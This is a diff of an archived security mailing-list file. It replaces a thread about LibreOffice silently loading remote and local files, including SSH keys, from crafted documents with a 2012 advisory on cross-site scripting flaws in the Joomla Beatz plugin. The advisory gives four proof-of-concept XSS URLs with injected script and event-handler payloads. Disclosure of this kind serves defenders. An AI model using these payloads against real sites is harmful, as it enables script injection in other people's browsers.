@@ -1,57 +1,82 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/12/14/3
-Message-Id: <201212140132.05038.tmb@65535.com>
-Date: Fri, 14 Dec 2012 01:31:59 +0000
-From: Tim Brown <tmb@...35.com>
-To: oss-security@...ts.openwall.com
-Cc: Kurt Seifried <kseifried@...hat.com>, Daniel Kahn Gillmor <dkg@...thhorseman.net>, Timo Warns <Warns@...-sense.de>
-Subject: Re: Remote file inclusion by office applications
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/15/4
+Message-ID: <CAPYM6Vxx-1nvBsVLqTZPsqDevfXkiR30-1H=+96ko0w4gGczLA@mail.gmail.com>
+Date: Mon, 16 Apr 2012 00:39:16 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
+To: full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>,  secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com,  moderators@...db.org, submissions@...ketstormsecurity.org,  submit@...ecurity.com, oss-security@...ts.openwall.com
+Subject: Joomla! Plugin - Beatz 1.x <= Multiple Cross Site Scripting Vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-On Friday 14 Dec 2012 00:24:33 Kurt Seifried wrote:
-> On 12/13/2012 11:53 AM, Daniel Kahn Gillmor wrote:
-> > On 12/13/2012 11:44 AM, Kurt Seifried wrote:
-> >> I'm kind of leaning towards classifying this as a security issue
-> >> since I expected there is some way to disable it or at least tell
-> >> it to prompt me when a document tries to go get an external data
-> >> source (e.g. "this document contains external data, the URLs/file
-> >> paths it is trying to  reference are: [list of locations]") but
-> >> apparently there is no way to disable/have this prompt (at least
-> >> that I can find in LibreOffice)?
-> > 
-> > I think your assessment is correct.  I've just now made an ODT file
-> > that libreoffice uses to not only hit the network for a PNG (denial
-> > of service attacks, remote exploitation of other flaws in libpng or
-> > in LO itself, virus scanner bypass, etc), but one that will include
-> > and render ~/.ssh/id_rsa as a text/plain document.  This seems like
-> > it could be done against any local privileged file.
-> > 
-> > For local file inclusion, libreoffice at leasts prompts me with:
-> > 
-> > ----------- This document contains one or more links to external
-> > data.
-> > 
-> > Would you like to change the document, and update all links to get
-> > the most recent data?
-> > 
-> > [Yes] [No] -----------
-> > 
-> > but it doesn't tell me what those documents are. And given the UI
-> > history of people clicking through popups they don't understand,
-> > i'm not convinced that this popup is going to do anything to
-> > prevent remote disclosure (it even defaults to "Yes").  When i say
-> > "no" on the prompt, it goes out and fetches networked URLs anyway,
-> > so i assume this prompt is supposed to just refer to local
-> > "external data".
-> > 
-> > --dkg
+1. OVERVIEW
 
-Confirmed.  By comparison both Okular and Calligra Office ignore the remote and 
-local file references (without even prompting).
+Beatz 1.x versions are vulnerable to Cross Site Scripting.
 
-Tim
--- 
-Tim Brown
-<mailto:tmb@...35.com>
 
-Download attachment "signature.asc " of type "application/pgp-signature" (837 bytes)
+2. BACKGROUND
+
+Beatz is a set of powerful Social Networking Script Joomla! 1.5
+plugins that allows you to start your own favourite artist band
+website. Although it is just a Joomla! plugin, it comes with full
+Joolma! bundle for ease of use and installation.
+
+
+3. VULNERABILITY DESCRIPTION
+
+Multiple parameters were not properly sanitized upon submission, which
+allows attacker to conduct Cross Site Scripting attack. This may allow
+an attacker to create a specially crafted URL that would execute
+arbitrary script code in a victim's browser. The vulnerable plugins
+include: com_find, com_charts and com_videos.
+
+
+4. VERSIONS AFFECTED
+
+Tested in 1.x versions
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+== Generic Joomla! 1.5 Double Encoding XSS
+
+http://localhost/beatz/?option=com_content&view=frontpage&limitstart=5&%2522%253e%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2f%2558%2553%2553%2f%2529%253c%2f%2573%2563%2572%2569%2570%2574%253e=1
+
+== com_charts (parameter: do)
+
+http://localhost/beatz/index.php?option=com_charts&view=charts&Itemid=76&chartkeyword=Acoustic&do=all%22%20style%3dbackground-image:url('javascript:alert(/XSS/)');width:1000px;height:1000px;display:block;"%20x=%22&option=com_charts
+
+== com_find (parameter: keyword)
+
+http://localhost/beatz/index.php?do=listAll&keyword=++Search"><img+src=0+onerror=prompt(/XSS/)>&option=com_find
+
+== com_videos (parameter: video_keyword)
+
+http://localhost/beatz/index.php?option=com_videos&view=videos&Itemid=59&video_keyword="+style="width:1000px;height:1000px;position:absolute;left:0;top:0"+onmouseover="alert(/xss/)&search=Search
+
+
+6. SOLUTION
+
+The vendor hasn't released the fixed yet.
+
+
+7. VENDOR
+
+Cogzidel Technologies Pvt Ltd.
+http://www.cogzidel.com/
+
+
+8. CREDIT
+
+Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2011-03-01: notified vendor
+2012-04-15: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL: http://yehg.net/lab/pr0js/advisories/%5Bbeatz_1.x%5D_xss
+
+#yehg [2012-04-15]
